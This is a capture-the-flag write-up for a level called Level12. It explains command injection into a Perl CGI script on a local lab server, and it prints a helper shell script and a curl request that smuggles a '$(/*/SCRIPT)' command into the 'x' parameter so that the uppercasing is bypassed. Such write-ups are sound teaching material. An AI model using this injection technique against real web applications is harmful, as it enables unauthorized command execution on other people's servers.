# Level12 Write-up

## Objective:

The goal of this level was to exploit a CGI script running on a Perl web server by manipulating the `x` parameter and retrieving the flag.

## Step-by-step process:

### Step 1: Analyzing the Perl CGI Script

I discovered that the level involved a Perl CGI script running on a web server at `localhost` on port `4646`. The script accepted a parameter `x` and had a peculiar behavior where it turned all letters in the `x` parameter into uppercase.

### Step 2: Creating the Exploit

I needed to exploit this behavior to execute a command that would retrieve the flag. To do this, I created a shell script (`/tmp/SCRIPT`) that would run the `getflag` command and store the result in a file.

I created the following script in `vim`:

```bash
#!/bin/bash

getflag > /tmp/result_level12
```

After creating the script, I made it executable:

```bash
chmod +x /tmp/SCRIPT
```

### Step 3: Crafting the Exploit Request

Since the Perl script turned all the letters in the `x` parameter into uppercase, I used a wildcard (`\*`) in the URL to bypass this and execute the `SCRIPT` script. The wildcard would match the case conversion and allow the script to execute as intended.

I crafted the following `curl` request to pass the exploit:

```bash
curl 'http://localhost:4646/?x=$(/*/SCRIPT)'
```

This executed the `/tmp/SCRIPT` script, running getflag, which saved the flag in `/tmp/result_level12`.

### Step 4: Retrieving the Flag

After executing the exploit, I retrieved the flag by reading the contents of the `/tmp/result_level12` file:

```bash
cat /tmp/result_level12
```
